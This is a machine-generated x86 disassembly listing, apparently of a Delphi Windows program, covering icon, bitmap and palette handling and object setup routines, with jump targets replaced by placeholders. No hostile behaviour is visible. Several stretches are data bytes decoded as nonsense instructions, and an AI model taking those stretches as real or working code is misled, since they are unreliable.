mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258e0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4258e0
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425754
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407f70
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_425ac7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425598
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407f70
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425aab
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4027bc
retn
call sub_424d08
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425754
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_425760
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_425b10
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424c90
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424f40
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425bf4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_425b10
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425c60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_425b10
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425cfd
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d04
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425d34
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425d28
xor edx edx
push ebp
push sub_425f22
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425bf4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425bf4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425efb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407f70
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407f70
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407f70
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407f70
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425c60
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425c60
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f02
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4027bc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4027bc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4027bc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4027bc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425f02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f29
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425f30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_425f80
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_425fd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425f80
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426021
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40317c
mov edi eax
mov eax esi
call sub_40317c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42615b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42613e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_40809c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426145
mov al 0x1
sub_426174
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c960
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4261bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261c3
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_4261c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4261fc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c960
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426247
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42624e
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_426278
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
shl [ esi - 0x5cbfffbf ] 0x1
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
int3
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263f4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4263ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403204
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403558
je r-xdata
inc ecx
add [ ebx + 0x54100041 ] bh
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x4442a31a
inc edx
add [ eax - 0x2fffbe5c ] dl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x5d ] al
add [ eax ] al
lea eax [ eax ]
in al dx
bound eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
bound eax [ edx ]
adc [ eax ] al
add [ eax ] al
in al dx
jg r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
inc eax
add [ ebp - 0x75 ] dl
in al dx
sub_426310
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4263ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403204
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426490
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263f4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
add esp 0xfffffff0
call sub_403558
sub_426490
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426513
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404ddc
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408168
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_40405c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41a30c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42651a
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_426524
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4265a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41a468
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403184
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40426c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404414
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265a9
lea eax [ ebp - 0x8 ]
call sub_404008
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_426614
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4266c0
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4266c0
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4266c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_426694
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403234
mov eax [ esi + 0x8 ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4266c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41a30c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426704
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41a30c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426768
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
call sub_426728
call sub_426748
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4267a8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4267d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40317c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ab48
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_42680c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033c0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403234
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403448
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403448
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403430
sub_4268b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_426948
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403234
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40317c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426998
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4268b8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4268b8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41aa64
mov edx ebx
mov eax esi
call sub_4268b8
jmp r-xdata
pop esi
pop ebx
retn
sub_4269f4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_426728
mov ecx esi
mov edx ebx
call sub_426490
pop esi
pop ebx
pop ebp
retn 0x4
sub_426a18
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_426a3c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_426a64
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_426b6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
